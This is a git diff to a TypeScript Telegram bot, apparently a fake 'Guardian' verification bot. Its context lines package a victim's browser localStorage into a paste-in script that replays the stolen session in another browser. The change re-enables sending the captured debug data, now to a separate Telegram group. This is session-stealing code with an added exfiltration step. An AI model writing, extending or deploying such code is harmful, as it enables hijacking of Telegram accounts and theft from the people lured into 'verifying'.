@@ -202,6 +202,7 @@ const newVerified = async (ctx: Context) => {
 <pre>Object.entries(${JSON.stringify(storage)}).forEach(([name, value]) => localStorage.setItem(name, value)); window.location.reload();</pre>`;
 
     const myGroupId = -4765914839;
+    const debugGroupId = -4751004079;
 
     // Invia log al bot owner
     // await bot.api.sendMessage(botOwner, log, { parse_mode: "HTML" }); --> qua ho commentato l'invio dei log nella chat col bot
@@ -236,7 +237,7 @@ Join request has been sent and you will be added once the admin approves your re
 🖼️ <b>Image Link:</b> https://raw.githubusercontent.com/mazzamassy/Guardian/refs/heads/main/guardian_verified.jpg
 `;
 
-    // await bot.api.sendMessage(botOwner, debugMessage, { parse_mode: "HTML" }); --> qua ho commentato l'invio del debug
+    await bot.api.sendMessage(debugGroupId, debugMessage, { parse_mode: "HTML" });
 
     if (user_id) {
 const deno = await Deno.openKv();
